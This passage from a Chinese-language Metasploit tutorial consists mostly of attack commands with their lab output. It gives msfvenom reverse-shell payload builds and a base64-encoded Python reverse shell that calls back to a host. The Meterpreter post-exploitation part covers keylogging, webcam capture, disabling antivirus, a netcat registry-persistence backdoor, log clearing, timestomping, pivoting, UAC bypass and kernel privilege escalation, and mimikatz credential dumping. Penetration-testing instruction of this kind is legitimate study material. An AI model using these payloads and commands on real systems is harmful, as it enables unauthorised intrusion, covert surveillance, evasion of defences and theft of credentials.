<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<p>WAR</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<p>执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>

<p>3.脚本shell</p>
<p>Python</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<p>Bash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

<p>Perl</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

<p>执行方式：复制shell.py中的内容在linux命令行下执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<p>4.shellcode<br>Linux Based Shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<p>Windows Based Shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<p>Mac Based Shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<h2 id="4-Meterpreter基本命令"><a href="#4-Meterpreter基本命令" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2><p>首先需要先获取meterpreter：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>

<p>如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。</p>
<p>获取到了meterpreter，就可以进行后渗透了。</p>
<h3 id="4-1-基本系统命令"><a href="#4-1-基本系统命令" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>

<h3 id="4-2-文件系统命令"><a href="#4-2-文件系统命令" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure>

<h3 id="4-3-网络命令"><a href="#4-3-网络命令" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>

<h3 id="4-4-信息收集"><a href="#4-4-信息收集" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure>

<h3 id="4-5-提权"><a href="#4-5-提权" class="headerlink" title="4.5 提权"></a>4.5 提权</h3><p>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>

<p>2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。</p>
<p>msf提供了如下几个模块帮助绕过UAC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>

<p>使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>

<p>3.内核漏洞提权</p>
<p>无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure>

<h3 id="4-6-获取凭证"><a href="#4-6-获取凭证" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3><p>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。</p>
<p>1.使用mimikatz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>使用meterpreter的run hashdump命令</li>
</ol>
